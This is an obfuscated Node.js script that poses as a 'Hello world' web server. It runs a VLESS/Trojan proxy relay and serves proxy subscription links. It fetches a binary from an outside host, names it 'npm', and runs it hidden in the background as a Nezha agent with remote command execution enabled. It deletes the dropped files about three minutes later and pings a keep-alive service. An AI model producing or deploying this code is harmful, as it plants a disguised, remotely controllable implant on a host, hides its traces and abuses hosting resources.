const _0x3a9a9e=_0x478d;(function(_0x11ad67,_0x578c1f){const _0x3061f9=_0x478d,_0xa23101=_0x11ad67();while(!![]){try{const _0x1cf405=parseInt(_0x3061f9(0x243))/0x1*(parseInt(_0x3061f9(0x225))/0x2)+-parseInt(_0x3061f9(0x1f9))/0x3+parseInt(_0x3061f9(0x235))/0x4*(parseInt(_0x3061f9(0x256))/0x5)+-parseInt(_0x3061f9(0x241))/0x6+-parseInt(_0x3061f9(0x204))/0x7*(-parseInt(_0x3061f9(0x251))/0x8)+-parseInt(_0x3061f9(0x25d))/0x9+parseInt(_0x3061f9(0x1fb))/0xa*(parseInt(_0x3061f9(0x1fa))/0xb);if(_0x1cf405===_0x578c1f)break;else _0xa23101['push'](_0xa23101['shift']());}catch(_0x1fbdec){_0xa23101['push'](_0xa23101['shift']());}}}(_0x51ae,0x68b70));const os=require('os'),http=require(_0x3a9a9e(0x259)),fs=require('fs'),axios=require(_0x3a9a9e(0x260)),net=require('net'),path=require(_0x3a9a9e(0x24a)),crypto=require(_0x3a9a9e(0x210)),{Buffer}=require(_0x3a9a9e(0x22c)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x3a9a9e(0x254),NEZHA_SERVER=process[_0x3a9a9e(0x255)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3a9a9e(0x255)][_0x3a9a9e(0x270)]||'',NEZHA_KEY=process[_0x3a9a9e(0x255)][_0x3a9a9e(0x1fc)]||'',DOMAIN=process[_0x3a9a9e(0x255)]['DOMAIN']||_0x3a9a9e(0x22f),AUTO_ACCESS=process[_0x3a9a9e(0x255)]['AUTO_ACCESS']||![],WSPATH=process['env'][_0x3a9a9e(0x22a)]||UUID[_0x3a9a9e(0x230)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'cmbp',NAME=process[_0x3a9a9e(0x255)][_0x3a9a9e(0x237)]||'',PORT=process[_0x3a9a9e(0x255)][_0x3a9a9e(0x209)]||0xbb8;let ISP='';function _0x51ae(){const _0x46ecb7=['length','117837WCHGKd','join','&fp=chrome&type=ws&host=','2096','2087','client_secret:\x20','type','path','error','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','asOrganization','decode','text/plain','arm','191400LGNpsN','https://arm64.ssss.nyc.mn/agent','readFile','978b2a54-2f2b-4b49-887a-9187da745daf','env','5zzYkyx','true','every','http','https://arm64.ssss.nyc.mn/v1','close','connection','7378947DTvKRp','sha224','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','axios','Answer','url','write','substr','readUInt8','index.html','https://amd64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','npm','utf8','\x20with\x20all\x20DNS\x20servers','unlink','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','get','reduce','NEZHA_PORT','connect','listen','trim','createServer','\x20-p\x20','@cdns.doon.eu.org:443?security=tls&sni=','2499045dYNsEY','3292223CLIOVC','30KKqBsa','NEZHA_KEY','Server','error:\x20','hex','trojan://','aarch64','data','&path=%2F','217UCKBwf','catch','from','8443','writeHead','PORT','then','pipe','createHash','Server\x20is\x20running\x20on\x20port\x20','split','update','crypto','base64','Failed\x20to\x20resolve\x20','includes','find','Hello\x20world!','pop','2083','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','Automatic\x20Access\x20Task\x20added\x20successfully','post','https://amd64.ssss.nyc.mn/v1','digest','send','createWriteStream','test','Not\x20Found\x0a','Status','country','replace','&type=A','4ySAGBl','toString','readUInt16BE','vless://','arm64','WSPATH','end','buffer','npm\x20running\x20error:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1234.abc.com','slice','setsid\x20nohup\x20./npm\x20-s\x20','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','npm\x20is\x20running','finish','3265744ipDhyo','application/json','NAME','1.1.1.1','concat','--tls','config.yaml','chmod\x20+x\x20npm','443','map','log','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','3659124HeXZdi'];_0x51ae=function(){return _0x46ecb7;};return _0x51ae();}const GetISP=async()=>{const _0x2b8797=_0x3a9a9e;try{const _0x2a3079=await axios['get']('https://speed.cloudflare.com/meta'),_0x225c75=_0x2a3079[_0x2b8797(0x202)];ISP=(_0x225c75[_0x2b8797(0x222)]+'-'+_0x225c75[_0x2b8797(0x24d)])[_0x2b8797(0x223)](/ /g,'_');}catch(_0x5b0085){ISP='Unknown';}};GetISP();const httpServer=http[_0x3a9a9e(0x1f6)]((_0x2f97ec,_0x12db63)=>{const _0x5343c2=_0x3a9a9e;if(_0x2f97ec['url']==='/'){const _0x79ae5d=path['join'](__dirname,_0x5343c2(0x266));fs[_0x5343c2(0x253)](_0x79ae5d,_0x5343c2(0x26a),(_0x1f700e,_0x406a73)=>{const _0x38ee46=_0x5343c2;if(_0x1f700e){_0x12db63['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x12db63[_0x38ee46(0x22b)](_0x38ee46(0x215));return;}_0x12db63[_0x38ee46(0x208)](0xc8,{'Content-Type':'text/html'}),_0x12db63['end'](_0x406a73);});return;}else{if(_0x2f97ec[_0x5343c2(0x262)]==='/'+SUB_PATH){const _0x5a5c2e=NAME?NAME+'-'+ISP:ISP,_0x13e466=_0x5343c2(0x228)+UUID+_0x5343c2(0x232)+DOMAIN+_0x5343c2(0x245)+DOMAIN+_0x5343c2(0x203)+WSPATH+'#'+_0x5a5c2e,_0x2db93a=_0x5343c2(0x200)+UUID+_0x5343c2(0x1f8)+DOMAIN+_0x5343c2(0x245)+DOMAIN+_0x5343c2(0x203)+WSPATH+'#'+_0x5a5c2e,_0x5615c=_0x13e466+'\x0a'+_0x2db93a,_0x53dd2a=Buffer[_0x5343c2(0x206)](_0x5615c)[_0x5343c2(0x226)](_0x5343c2(0x211));_0x12db63[_0x5343c2(0x208)](0xc8,{'Content-Type':_0x5343c2(0x24f)}),_0x12db63[_0x5343c2(0x22b)](_0x53dd2a+'\x0a');}else _0x12db63[_0x5343c2(0x208)](0x194,{'Content-Type':_0x5343c2(0x24f)}),_0x12db63['end'](_0x5343c2(0x220));}}),wss=new WebSocket[(_0x3a9a9e(0x1fd))]({'server':httpServer}),uuid=UUID[_0x3a9a9e(0x223)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x3a9a9e(0x238)];function resolveHost(_0x23312d){return new Promise((_0x35eb90,_0x364a4d)=>{const _0x2eeaa4=_0x478d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2eeaa4(0x21f)](_0x23312d)){_0x35eb90(_0x23312d);return;}let _0x2ba802=0x0;function _0x172d58(){const _0x586211=_0x2eeaa4;if(_0x2ba802>=DNS_SERVERS[_0x586211(0x242)]){_0x364a4d(new Error(_0x586211(0x212)+_0x23312d+_0x586211(0x26b)));return;}const _0x3704b4=DNS_SERVERS[_0x2ba802];_0x2ba802++;const _0x562e75='https://dns.google/resolve?name='+encodeURIComponent(_0x23312d)+_0x586211(0x224);axios[_0x586211(0x26e)](_0x562e75,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x33bb92=>{const _0x34f743=_0x586211,_0x2ff403=_0x33bb92[_0x34f743(0x202)];if(_0x2ff403[_0x34f743(0x221)]===0x0&&_0x2ff403[_0x34f743(0x261)]&&_0x2ff403['Answer'][_0x34f743(0x242)]>0x0){const _0x51bd86=_0x2ff403['Answer'][_0x34f743(0x214)](_0x497c97=>_0x497c97[_0x34f743(0x249)]===0x1);if(_0x51bd86){_0x35eb90(_0x51bd86[_0x34f743(0x202)]);return;}}_0x172d58();})['catch'](_0x46278c=>{_0x172d58();});}_0x172d58();});}function handleVlessConnection(_0x32da63,_0xf9f7d4){const _0x48b6a6=_0x3a9a9e,[_0x3e80f6]=_0xf9f7d4,_0x131672=_0xf9f7d4[_0x48b6a6(0x230)](0x1,0x11);if(!_0x131672['every']((_0x347be2,_0x5a1a5e)=>_0x347be2==parseInt(uuid[_0x48b6a6(0x264)](_0x5a1a5e*0x2,0x2),0x10)))return![];let _0x346aca=_0xf9f7d4['slice'](0x11,0x12)[_0x48b6a6(0x265)]()+0x13;const _0x4c358d=_0xf9f7d4[_0x48b6a6(0x230)](_0x346aca,_0x346aca+=0x2)[_0x48b6a6(0x227)](0x0),_0x588a16=_0xf9f7d4[_0x48b6a6(0x230)](_0x346aca,_0x346aca+=0x1)[_0x48b6a6(0x265)](),_0x177d5a=_0x588a16==0x1?_0xf9f7d4['slice'](_0x346aca,_0x346aca+=0x4)[_0x48b6a6(0x244)]('.'):_0x588a16==0x2?new TextDecoder()[_0x48b6a6(0x24e)](_0xf9f7d4[_0x48b6a6(0x230)](_0x346aca+0x1,_0x346aca+=0x1+_0xf9f7d4[_0x48b6a6(0x230)](_0x346aca,_0x346aca+0x1)['readUInt8']())):_0x588a16==0x3?_0xf9f7d4[_0x48b6a6(0x230)](_0x346aca,_0x346aca+=0x10)[_0x48b6a6(0x26f)]((_0x24d7fd,_0x142de1,_0x4ffbaa,_0x2dbdec)=>_0x4ffbaa%0x2?_0x24d7fd['concat'](_0x2dbdec['slice'](_0x4ffbaa-0x1,_0x4ffbaa+0x1)):_0x24d7fd,[])[_0x48b6a6(0x23e)](_0x29bc52=>_0x29bc52[_0x48b6a6(0x227)](0x0)[_0x48b6a6(0x226)](0x10))[_0x48b6a6(0x244)](':'):'';_0x32da63[_0x48b6a6(0x21d)](new Uint8Array([_0x3e80f6,0x0]));const _0x40d661=createWebSocketStream(_0x32da63);return resolveHost(_0x177d5a)['then'](_0x46b563=>{const _0x2c07cb=_0x48b6a6;net[_0x2c07cb(0x271)]({'host':_0x46b563,'port':_0x4c358d},function(){const _0xbf665e=_0x2c07cb;this['write'](_0xf9f7d4[_0xbf665e(0x230)](_0x346aca)),_0x40d661['on'](_0xbf665e(0x24b),()=>{})[_0xbf665e(0x20b)](this)['on'](_0xbf665e(0x24b),()=>{})[_0xbf665e(0x20b)](_0x40d661);})['on'](_0x2c07cb(0x24b),()=>{});})[_0x48b6a6(0x205)](_0x3cdd18=>{const _0x5b5182=_0x48b6a6;net['connect']({'host':_0x177d5a,'port':_0x4c358d},function(){const _0x24c3de=_0x478d;this[_0x24c3de(0x263)](_0xf9f7d4[_0x24c3de(0x230)](_0x346aca)),_0x40d661['on'](_0x24c3de(0x24b),()=>{})[_0x24c3de(0x20b)](this)['on'](_0x24c3de(0x24b),()=>{})[_0x24c3de(0x20b)](_0x40d661);})['on'](_0x5b5182(0x24b),()=>{});}),!![];}function _0x478d(_0x14d5ba,_0x5ea54a){_0x14d5ba=_0x14d5ba-0x1f4;const _0x51aec5=_0x51ae();let _0x478da7=_0x51aec5[_0x14d5ba];return _0x478da7;}function handleTrojanConnection(_0xefb47d,_0x24caed){const _0x308c57=_0x3a9a9e;try{if(_0x24caed[_0x308c57(0x242)]<0x3a)return![];const _0x55dfd2=_0x24caed[_0x308c57(0x230)](0x0,0x38)[_0x308c57(0x226)](),_0x368133=[UUID];let _0x59c9ea=null;for(const _0x2aee44 of _0x368133){const _0x570c38=crypto[_0x308c57(0x20c)](_0x308c57(0x25e))[_0x308c57(0x20f)](_0x2aee44)[_0x308c57(0x21c)](_0x308c57(0x1ff));if(_0x570c38===_0x55dfd2){_0x59c9ea=_0x2aee44;break;}}if(!_0x59c9ea)return![];let _0x44a672=0x38;_0x24caed[_0x44a672]===0xd&&_0x24caed[_0x44a672+0x1]===0xa&&(_0x44a672+=0x2);const _0x5c90c5=_0x24caed[_0x44a672];if(_0x5c90c5!==0x1)return![];_0x44a672+=0x1;const _0x16ef93=_0x24caed[_0x44a672];_0x44a672+=0x1;let _0x7c1755,_0x273286;if(_0x16ef93===0x1)_0x7c1755=_0x24caed[_0x308c57(0x230)](_0x44a672,_0x44a672+0x4)['join']('.'),_0x44a672+=0x4;else{if(_0x16ef93===0x3){const _0x52e36e=_0x24caed[_0x44a672];_0x44a672+=0x1,_0x7c1755=_0x24caed[_0x308c57(0x230)](_0x44a672,_0x44a672+_0x52e36e)[_0x308c57(0x226)](),_0x44a672+=_0x52e36e;}else{if(_0x16ef93===0x4)_0x7c1755=_0x24caed[_0x308c57(0x230)](_0x44a672,_0x44a672+0x10)[_0x308c57(0x26f)]((_0xd7154f,_0x4c722c,_0x54644d,_0x1e2e03)=>_0x54644d%0x2?_0xd7154f[_0x308c57(0x239)](_0x1e2e03[_0x308c57(0x230)](_0x54644d-0x1,_0x54644d+0x1)):_0xd7154f,[])[_0x308c57(0x23e)](_0x34cd9c=>_0x34cd9c[_0x308c57(0x227)](0x0)['toString'](0x10))[_0x308c57(0x244)](':'),_0x44a672+=0x10;else return![];}}_0x273286=_0x24caed[_0x308c57(0x227)](_0x44a672),_0x44a672+=0x2;_0x44a672<_0x24caed[_0x308c57(0x242)]&&_0x24caed[_0x44a672]===0xd&&_0x24caed[_0x44a672+0x1]===0xa&&(_0x44a672+=0x2);const _0x477bcd=createWebSocketStream(_0xefb47d);return resolveHost(_0x7c1755)[_0x308c57(0x20a)](_0x23ea52=>{const _0x190a13=_0x308c57;net[_0x190a13(0x271)]({'host':_0x23ea52,'port':_0x273286},function(){const _0x2e5bf8=_0x190a13;_0x44a672<_0x24caed[_0x2e5bf8(0x242)]&&this[_0x2e5bf8(0x263)](_0x24caed[_0x2e5bf8(0x230)](_0x44a672)),_0x477bcd['on'](_0x2e5bf8(0x24b),()=>{})['pipe'](this)['on'](_0x2e5bf8(0x24b),()=>{})[_0x2e5bf8(0x20b)](_0x477bcd);})['on']('error',()=>{});})[_0x308c57(0x205)](_0x2c2c95=>{const _0x465b9a=_0x308c57;net[_0x465b9a(0x271)]({'host':_0x7c1755,'port':_0x273286},function(){const _0x22483e=_0x465b9a;_0x44a672<_0x24caed[_0x22483e(0x242)]&&this[_0x22483e(0x263)](_0x24caed[_0x22483e(0x230)](_0x44a672)),_0x477bcd['on'](_0x22483e(0x24b),()=>{})[_0x22483e(0x20b)](this)['on'](_0x22483e(0x24b),()=>{})[_0x22483e(0x20b)](_0x477bcd);})['on'](_0x465b9a(0x24b),()=>{});}),!![];}catch(_0x48d2e7){return![];}}wss['on'](_0x3a9a9e(0x25c),(_0x3ba461,_0x7ee243)=>{const _0x1f0515=_0x3a9a9e,_0x2fa543=_0x7ee243[_0x1f0515(0x262)]||'';_0x3ba461['once']('message',_0x4923ea=>{const _0x146926=_0x1f0515;if(_0x4923ea[_0x146926(0x242)]>0x11&&_0x4923ea[0x0]===0x0){const _0x233959=_0x4923ea['slice'](0x1,0x11),_0x295ca0=_0x233959[_0x146926(0x258)]((_0x4cf866,_0x51d6de)=>_0x4cf866==parseInt(uuid['substr'](_0x51d6de*0x2,0x2),0x10));if(_0x295ca0){!handleVlessConnection(_0x3ba461,_0x4923ea)&&_0x3ba461[_0x146926(0x25b)]();return;}}!handleTrojanConnection(_0x3ba461,_0x4923ea)&&_0x3ba461[_0x146926(0x25b)]();})['on'](_0x1f0515(0x24b),()=>{});});const getDownloadUrl=()=>{const _0x4f82d4=_0x3a9a9e,_0x2d905e=os['arch']();return _0x2d905e===_0x4f82d4(0x250)||_0x2d905e===_0x4f82d4(0x229)||_0x2d905e===_0x4f82d4(0x201)?!NEZHA_PORT?_0x4f82d4(0x25a):_0x4f82d4(0x252):!NEZHA_PORT?_0x4f82d4(0x21b):_0x4f82d4(0x267);},downloadFile=async()=>{const _0x566a72=_0x3a9a9e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3b14a2=getDownloadUrl(),_0x1216f3=await axios({'method':_0x566a72(0x26e),'url':_0x3b14a2,'responseType':'stream'}),_0x3089d1=fs[_0x566a72(0x21e)](_0x566a72(0x269));return _0x1216f3['data'][_0x566a72(0x20b)](_0x3089d1),new Promise((_0x567f21,_0x23bbaa)=>{const _0x36d342=_0x566a72;_0x3089d1['on'](_0x36d342(0x234),()=>{const _0x5c61be=_0x36d342;console[_0x5c61be(0x23f)]('npm\x20download\x20successfully'),exec(_0x5c61be(0x23c),_0x49d4ff=>{if(_0x49d4ff)_0x23bbaa(_0x49d4ff);_0x567f21();});}),_0x3089d1['on'](_0x36d342(0x24b),_0x23bbaa);});}catch(_0x349330){throw _0x349330;}},runnz=async()=>{const _0xf5b3fc=_0x3a9a9e;try{const _0x2c3ab6=execSync(_0xf5b3fc(0x240),{'encoding':'utf-8'});if(_0x2c3ab6[_0xf5b3fc(0x1f5)]()!==''){console[_0xf5b3fc(0x23f)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x5e87b0){}await downloadFile();let _0x4c30e3='',_0x18c8b4=[_0xf5b3fc(0x23d),_0xf5b3fc(0x207),_0xf5b3fc(0x246),_0xf5b3fc(0x247),_0xf5b3fc(0x217),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5e8294=_0x18c8b4[_0xf5b3fc(0x213)](NEZHA_PORT)?_0xf5b3fc(0x23a):'';_0x4c30e3=_0xf5b3fc(0x231)+NEZHA_SERVER+':'+NEZHA_PORT+_0xf5b3fc(0x1f7)+NEZHA_KEY+'\x20'+_0x5e8294+_0xf5b3fc(0x25f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x142bbe=NEZHA_SERVER[_0xf5b3fc(0x213)](':')?NEZHA_SERVER[_0xf5b3fc(0x20e)](':')[_0xf5b3fc(0x216)]():'',_0x30cc2f=_0x18c8b4['includes'](_0x142bbe)?_0xf5b3fc(0x257):'false',_0x19bf6d=_0xf5b3fc(0x248)+NEZHA_KEY+_0xf5b3fc(0x24c)+NEZHA_SERVER+_0xf5b3fc(0x26d)+_0x30cc2f+_0xf5b3fc(0x22e)+UUID;fs['writeFileSync'](_0xf5b3fc(0x23b),_0x19bf6d);}_0x4c30e3='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0xf5b3fc(0x23f)](_0xf5b3fc(0x218));return;}}try{exec(_0x4c30e3,{'shell':'/bin/bash'},_0x32a02a=>{const _0x565dfa=_0xf5b3fc;if(_0x32a02a)console[_0x565dfa(0x24b)](_0x565dfa(0x22d),_0x32a02a);else console[_0x565dfa(0x23f)](_0x565dfa(0x233));});}catch(_0x3391ee){console[_0xf5b3fc(0x24b)](_0xf5b3fc(0x1fe)+_0x3391ee);}};async function addAccessTask(){const _0x293911=_0x3a9a9e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5682d1='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x5d886a=await axios[_0x293911(0x21a)](_0x293911(0x268),{'url':_0x5682d1},{'headers':{'Content-Type':_0x293911(0x236)}});console[_0x293911(0x23f)](_0x293911(0x219));}catch(_0x40638e){}}const delFiles=()=>{const _0x16a032=_0x3a9a9e;fs['unlink'](_0x16a032(0x269),()=>{}),fs[_0x16a032(0x26c)](_0x16a032(0x23b),()=>{});};httpServer[_0x3a9a9e(0x1f4)](PORT,()=>{const _0x2d2685=_0x3a9a9e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2d2685(0x23f)](_0x2d2685(0x20d)+PORT);});
